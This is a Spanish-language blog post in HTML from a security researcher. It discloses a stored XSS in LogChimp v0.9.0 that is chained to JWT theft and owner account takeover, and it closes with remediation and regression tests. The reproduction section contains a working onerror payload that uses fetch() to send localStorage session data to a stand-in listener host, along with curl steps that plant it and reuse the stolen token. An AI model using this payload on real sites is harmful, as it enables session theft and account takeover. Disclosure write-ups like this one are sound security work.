@@ -1,0 +1,235 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Stored XSS en LogChimp: de contentMarkdown al robo de JWT | ZsZsec</title>
+  <meta name="description" content="Investigación sobre un stored XSS en LogChimp que permitía robar el JWT de usuarios y asumir una sesión de propietario." />
+  <meta name="author" content="Santiago Bedoya (ZsZsec)" />
+  <link rel="canonical" href="https://zszsec.github.io/articulos/logchimp-stored-xss-jwt-theft.html" />
+  <meta property="og:title" content="Stored XSS en LogChimp: de contentMarkdown al robo de JWT" />
+  <meta property="og:description" content="Investigación sobre un stored XSS en LogChimp que permitía robar el JWT de usuarios." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://zszsec.github.io/articulos/logchimp-stored-xss-jwt-theft.html" />
+  <meta property="og:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta property="og:image:alt" content="ZsZsec | Security Researcher" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Stored XSS en LogChimp: de contentMarkdown al robo de JWT" />
+  <meta name="twitter:description" content="Stored XSS en LogChimp con robo de JWT y toma de sesión." />
+  <meta name="twitter:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta name="theme-color" content="#000000" />
+  <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml" />
+  <link rel="stylesheet" href="../assets/style.css" />
+</head>
+<body>
+  <div class="scanline"></div>
+  <header class="site-header">
+    <a class="brand" href="../index.html" aria-label="Inicio"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+    <nav class="nav" aria-label="Navegación principal"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link active" href="../articulos.html" aria-current="page">Artículos</a><a class="nav-link" href="../bug-bounty.html">Bug Bounty</a><a class="nav-link" href="../writeups.html">Writeups</a></nav>
+  </header>
+  <main>
+    <section class="page-hero compact">
+      <p class="eyebrow">source code research / logchimp</p>
+      <h1>Stored XSS to JWT theft<span>_</span></h1>
+        <div class="writeup-meta"><span>Critical</span><span>Stored XSS / JWT theft</span><span>Responded</span></div>
+      <div class="tag-row"><span class="tag">Source Code Review</span><span class="tag">Stored XSS</span><span class="tag">Account Takeover</span><span class="tag">Vue.js</span><span class="tag">JWT</span></div>
+    </section>
+    <section class="content-shell">
+      <article class="markdown-body">
+        <p>Durante mi revisión de LogChimp v0.9.0 encontré que el contenido de los posts podía recorrer todo el flujo desde la API hasta un sink <code>v-html</code> sin sanitización. Una cuenta recién registrada podía guardar HTML con JavaScript en un post público y ejecutar el payload en el navegador de cualquier persona que abriera esa publicación.</p>
+
+        <p>El impacto aumentaba por dos decisiones de la configuración predeterminada: el token de sesión se almacenaba en <code>localStorage</code> y la aplicación no enviaba una Content Security Policy. En mi instancia local confirmé la cadena completa al capturar el JWT de una sesión de propietario y reutilizarlo contra endpoints autenticados y funciones reservadas.</p>
+
+        <blockquote><p>Toda la validación se realizó en una instancia local controlada. Los dominios, credenciales, tokens e identificadores de esta publicación son sintéticos.</p></blockquote>
+
+        <h2>Ficha técnica</h2>
+
+        <table>
+          <thead><tr><th>Campo</th><th>Detalle</th></tr></thead>
+          <tbody>
+            <tr><td>Producto</td><td>LogChimp self-hosted / community edition</td></tr>
+            <tr><td>Repositorio</td><td><a href="https://github.com/logchimp/logchimp" target="_blank" rel="noopener noreferrer">github.com/logchimp/logchimp</a></td></tr>
+            <tr><td>Reporte enviado</td><td>19 de julio de 2026</td></tr>
+            <tr><td>Versión afectada</td><td>v0.9.0 / <code>master</code> al momento de la prueba</td></tr>
+            <tr><td>Fecha de la investigación</td><td>2026-07-19</td></tr>
+            <tr><td>Vulnerabilidad principal</td><td>Stored XSS — CWE-79</td></tr>
+            <tr><td>Campo</td><td><code>posts.contentMarkdown</code></td></tr>
+            <tr><td>Sink</td><td>Vue <code>v-html</code></td></tr>
+            <tr><td>Requisito del atacante</td><td>Cuenta normal creada mediante el signup público</td></tr>
+            <tr><td>Interacción de la víctima</td><td>Abrir un post público</td></tr>
+            <tr><td>CVSS 3.1</td><td>9.0 Critical</td></tr>
+            <tr><td>Vector</td><td><code>AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H</code></td></tr>
+            <tr><td>Estado del reporte</td><td>Responded / corregido por el proyecto</td></tr>
+          </tbody>
+        </table>
+
+        <h2>Superficie predeterminada</h2>
+
+        <p>No necesité privilegios administrativos ni una configuración especial. Dos migraciones mostraban que:</p>
+
+        <ol>
+          <li><code>allowSignup</code> estaba habilitado por defecto.</li>
+          <li>El permiso <code>post:create</code> se asignaba al rol <code>@everyone</code> de los usuarios registrados.</li>
+        </ol>
+
+        <p>Las rutas relevantes eran funcionalidad central de la edición comunitaria, no una característica limitada por una licencia empresarial. El flujo empezaba desde un usuario de bajo privilegio, aunque el registro público permitía llegar a ese estado sin una cuenta previa.</p>
+
+        <h2>Del almacenamiento al sink</h2>
+
+        <p>En el servidor, los controladores de creación y actualización guardaban <code>contentMarkdown</code> sin sanitizar:</p>
+
+        <pre><code>packages/server/src/controllers/post/create.ts
+packages/server/src/controllers/post/updatePost.ts</code></pre>
+
+        <p>En el cliente, la página de detalle convertía saltos de línea en <code>&lt;br&gt;</code> y enviaba el resultado a <code>v-html</code>:</p>
+
+        <pre><code class="language-vue">&lt;p v-html="postContent" /&gt;</code></pre>
+
+        <pre><code class="language-javascript">postContent = contentMarkdown.replace(/\n/g, "&lt;br&gt;");</code></pre>
+
+        <p>La sustitución de saltos de línea no es un parser de Markdown ni una medida de seguridad. Un valor como <code>&lt;img onerror=...&gt;</code> conservaba su significado HTML y Vue lo insertaba en el DOM.</p>
+
+        <p>El sink estaba en:</p>
+
+        <pre><code>packages/theme/src/pages/posts/_slug/Index.vue</code></pre>
+
+        <p>La cadena principal era directa:</p>
+
+        <pre><code>contentMarkdown controlado por un usuario
+        ↓
+almacenamiento sin sanitización
+        ↓
+API devuelve el valor sin cambios
+        ↓
+replace de saltos de línea
+        ↓
+v-html
+        ↓
+ejecución de eventos HTML</code></pre>
+
+        <h2>Por qué llegaba a account takeover</h2>
+
+        <p>La store de usuario persistía <code>authToken</code> dentro del objeto <code>user</code> guardado en <code>localStorage</code>:</p>
+
+        <pre><code>packages/theme/src/store/user.ts
+localStorage["user"] → objeto de sesión con authToken</code></pre>
+
+        <p>Un XSS ejecutado en el origen de la aplicación podía leer ese valor. La configuración predeterminada tampoco añadía una CSP que bloqueara manejadores inline como <code>onerror</code>.</p>
+
+        <p>El payload que utilicé en el laboratorio fue equivalente a este:</p>
+
+        <pre><code class="language-html">&lt;img src=x onerror="fetch('https://listener.example.test/collect?d='+encodeURIComponent(localStorage.getItem('user')))"&gt;</code></pre>
+
+        <p>Cuando el propietario abría el post, el navegador intentaba cargar <code>x</code>, disparaba <code>onerror</code> y enviaba el objeto de sesión al listener controlado. El JWT recuperado seguía siendo válido para la API, así que podía reutilizarlo hasta que expirara o fuera revocado.</p>
+
+        <h2>Reproducción local</h2>
+
+        <p>Definí la instancia de laboratorio:</p>
+
+        <pre><code class="language-bash">BASE="http://localhost:8000"
+API="$BASE/api/v1"</code></pre>
+
+        <p>Primero creé la cuenta propietaria que usaría como víctima:</p>
+
+        <pre><code class="language-bash">curl -s -X POST "$API/auth/setup" \
+  -H "Content-Type: application/json" \
+  -d '{
+    "name":"Admin",
+    "email":"owner@example.test",
+    "password":"OwnerPass123!",
+    "siteTitle":"Research Lab"
+  }'</code></pre>
+
+        <p>Después registré una cuenta normal e inicié sesión:</p>
+
+        <pre><code class="language-bash">curl -s -X POST "$API/auth/signup" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"attacker@example.test","password":"AttackerPass123!"}'
+
+TOKEN=$(curl -s -X POST "$API/auth/login" \
+  -H "Content-Type: application/json" \
+  -d '{"email":"attacker@example.test","password":"AttackerPass123!"}' |
+  jq -r '.user.authToken')</code></pre>
+
+        <p>Con ese token creé un post público que contenía el payload:</p>
+
+        <pre><code class="language-bash">PAYLOAD='&lt;img src=x onerror="fetch('\''https://listener.example.test/collect?d='\''+encodeURIComponent(localStorage.getItem('\''user'\'')))"&gt;'
+
+jq -n \
+  --arg title "Feature request" \
+  --arg contentMarkdown "$PAYLOAD" \
+  '{title:$title,contentMarkdown:$contentMarkdown}' |
+curl -s -X POST "$API/posts" \
+  -H "Content-Type: application/json" \
+  -H "Authorization: Bearer $TOKEN" \
+  --data-binary @-</code></pre>
+
+        <p>No hacía falta engañar a la víctima para ejecutar un botón o una confirmación. La ejecución ocurría cuando abría la página pública del post como parte del uso normal del feedback board.</p>
+
+        <h2>Evidencia de impersonación</h2>
+
+        <p>El listener recibió el objeto serializado de la sesión del propietario, incluido su JWT. Para comprobar el impacto sin modificar información adicional, reutilicé el token contra el perfil:</p>
+
+        <pre><code class="language-bash">curl -s "$API/users/profile" \
+  -H "Authorization: Bearer &lt;STOLEN_OWNER_TOKEN&gt;"</code></pre>
+
+        <p>La API devolvió los datos reales de la cuenta víctima. Después consulté una función reservada al propietario:</p>
+
+        <pre><code class="language-bash">curl -i "$API/users" \
+  -H "Authorization: Bearer &lt;STOLEN_OWNER_TOKEN&gt;"</code></pre>
+
+        <p>La respuesta <code>200 OK</code> confirmó que el token exfiltrado conservaba los privilegios del propietario y permitía impersonar esa sesión.</p>
+
+        <h2>Factores que amplificaban el impacto</h2>
+
+        <p>La vulnerabilidad primaria era el stored XSS. Estas condiciones hacían más directa la escalada:</p>
+
+        <ol>
+          <li>Registro público habilitado por defecto.</li>
+          <li>Permiso de creación de posts para todo usuario registrado.</li>
+          <li>Posts accesibles públicamente.</li>
+          <li>JWT legible desde JavaScript en <code>localStorage</code>.</li>
+          <li>Ausencia de CSP en la configuración predeterminada revisada.</li>
+        </ol>
+
+        <p>El archivo <code>packages/server/src/app.ts</code> no configuraba una política CSP y tampoco encontré una equivalente en el frontend. Un proxy externo podría añadirla, pero no formaba parte de la instalación predeterminada que probé.</p>
+
+        <h2>Impacto</h2>
+
+        <p>Una cuenta normal podía persistir JavaScript en una página pública. Cualquier usuario que visitara el post ejecutaba ese código en el origen de LogChimp, incluido el propietario del sitio.</p>
+
+        <p>En mi prueba, esto permitió extraer y reutilizar el JWT del propietario. La sesión robada daba acceso a administración de usuarios, configuración, roles y permisos. La puntuación estimada fue <code>9.0 Critical</code> con el vector <code>AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H</code>.</p>
+
+        <h2>Remediación</h2>
+
+        <p>La corrección principal debe eliminar el HTML no confiable antes del sink:</p>
+
+        <ol>
+          <li>Procesar <code>contentMarkdown</code> con un renderer de Markdown que tenga HTML deshabilitado.</li>
+          <li>Sanitizar el HTML renderizado mediante una allowlist antes de mostrarlo.</li>
+          <li>Evitar <code>v-html</code> cuando el contenido pueda construirse con nodos o interpolación de texto.</li>
+          <li>Aplicar la misma protección en creación, actualización y cualquier otra vista del post.</li>
+          <li>Auditar los demás usos de <code>v-html</code> en <code>packages/theme</code>.</li>
+        </ol>
+
+        <p>Como defensa en profundidad, añadiría una CSP estricta sin <code>unsafe-inline</code>, con al menos <code>script-src 'self'</code>, <code>object-src 'none'</code> y <code>base-uri 'self'</code>.</p>
+
+        <p>También movería la sesión a una cookie <code>httpOnly</code>, <code>Secure</code> y <code>SameSite</code>, acompañada de protección CSRF. Eso impediría leer directamente el JWT desde JavaScript, pero no corregiría el XSS: el código inyectado todavía podría intentar realizar acciones same-origin desde el navegador de la víctima.</p>
+
+        <h2>Pruebas de regresión</h2>
+
+        <pre><code>&lt;img src=x onerror=alert(1)&gt; en create  → no crea un handler ejecutable
+payload equivalente en update           → no crea un handler ejecutable
+HTML dentro de Markdown                  → se elimina o se muestra como texto
+post público con contenido seguro        → conserva el formato permitido
+respuestas HTTP                          → incluyen la CSP definida</code></pre>
+
+        <h2>Estado</h2>
+
+        <p>Confirmé la vulnerabilidad en una instancia local sobre LogChimp v0.9.0 y el <code>master</code> disponible durante la revisión. El proyecto respondió al reporte y corrigió el problema.</p>
+      </article>
+    </section>
+  </main>
+  <footer class="site-footer"><span>ZsZsec</span></footer>
+</body>
+</html>
